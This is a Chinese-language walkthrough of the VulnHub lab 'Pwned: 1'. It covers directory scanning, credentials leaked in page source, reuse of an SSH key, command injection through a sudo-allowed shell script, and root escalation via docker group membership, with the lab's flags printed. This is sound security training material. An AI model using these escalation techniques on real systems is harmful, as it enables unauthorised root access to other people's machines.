# Pwned: 1

2024-5-23 https://www.vulnhub.com/entry/pwnlab-1,507/

difficulty: easy

## IP

192.168.5.29

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fecd90197491aef564a8a5e86f6eef7e (RSA)
|   256 813293bded9be798af2506795fde915d (ECDSA)
|_  256 dd72745d4d2da3623e81af0951e0144a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
```

21 ftp 不能匿名登陆。

22 ssh banner 上没有提示信息。

看看 80 web 上有什么信息，gobuster 扫描后，发现几个目录链接。

http://192.168.5.29/robots.txt 提示 /nothing

http://192.168.5.29/nothing/nothing.html 是个坑，没东西。

http://192.168.5.29/hidden_text/ 显示了一个 secret.dic，显示了一堆目录。

使用 gobuster，字典为 secret.dic，再次进行扫描。结果 http://192.168.5.29/pwned.vuln/ 这个目录可用。

是一个登陆页面，查看源代码，发现了提示：

```

<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else
//	echo "Invalid creds"
// }
?>
```

这个密码估计到死都报不出来，使用这个用户凭据，登陆看看有什么内容，登陆没反应是个死页面，猜想有没有可能是 ssh 的用户凭据，尝试登陆 ssh，登陆成功。

靶场描述说有 3 个旗帜，开始寻找吧。

/home 目录中发现几个账户：ariana、selena

在 share 目录中发现 note.txt：

```
ftpuser@pwned:~/share$ cat note.txt

Wow you are here

ariana won't happy about this note

sorry ariana :(
```

ftpuser 用户没有 sudo、suid、cap、crontab 等特殊设置。

发现了一个 id_rsa 私钥，不知道是 ariana、selena 哪个用户的，下载到 kali 上进行挨个尝试，结果发现是 ariana 的私钥，登陆到 ariana 继续寻找 flag。

找到了第一个 flag：

```
ariana@pwned:~$ cat user1.txt
congratulations you Pwned ariana

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

然后发现了另一个提示：

```
ariana@pwned:~$ cat ariana-personal.diary
Its Ariana personal Diary :::

Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
```

好像又没提示出什么东西。

继续按找老套路寻找提权点， sudo -l 发现：

```
(selena) NOPASSWD: /home/messenger.sh
```

利用这个脚本可能切换到 selena 用户，看看源码：

```bash
#!/bin/bash

clear
echo "Welcome to linux.messenger "

users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)

echo "$users"

read -p "Enter username to send message : " name

read -p "Enter message for $name :" msg

echo "Sending message to $name "

$msg 2> /dev/null

echo "Message sent to $name :) "
```

`$msg 2> /dev/null` 这里能够执行带入的命令

```
sudo -u selena /home/messenger.sh

Enter username to send message : ariana

Enter message for ariana :/bin/bash

Sending message to ariana
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

得到了 selena 的权限，得到了第 2 个 flag：

```
cat /home/selena/user2.txt
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

另外一个提示文件：

```
selena@pwned:~$ cat selena-personal.diary
Its Selena personal Diary :::

Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
```

这个提示没什么用，最开始就拿到了 id_rsa

看看 selena 有什么权限，属于 docker 组。

docker images 看到了几个 docker 镜像，让我们看看这几个镜像的构建命令是什么 : docker history imageID

```
selena@pwned:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        3 years ago         88.3MB
<none>              <none>              e13ad046d435        3 years ago         88.3MB
alpine              latest              a24bb4013296        3 years ago         5.57MB
debian              wheezy              10fcec6d95c4        5 years ago         88.3MB
```

可以利用 docker 组用户提权，将宿主机的根目录挂在到 docker 镜像中的/mnt 目录下：

```
selena@pwned:~$ docker run -v /:/mnt --rm -it 10fcec6d95c4 chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /mnt/root
# ls -al
total 28
drwx------  3 root root 4096 Jul 10  2020 .
drwxr-xr-x 18 root root 4096 Jul  6  2020 ..
-rw-------  1 root root  292 Jul 10  2020 .bash_history
-rw-r--r--  1 root root  601 Jul  6  2020 .bashrc
drwxr-xr-x  3 root root 4096 Jul  4  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  429 Jul 10  2020 root.txt
# cat root.txt
4d4098d64e163d2726959455d046fd7c

You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)

You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker

Twitter    Ajs_walker
```
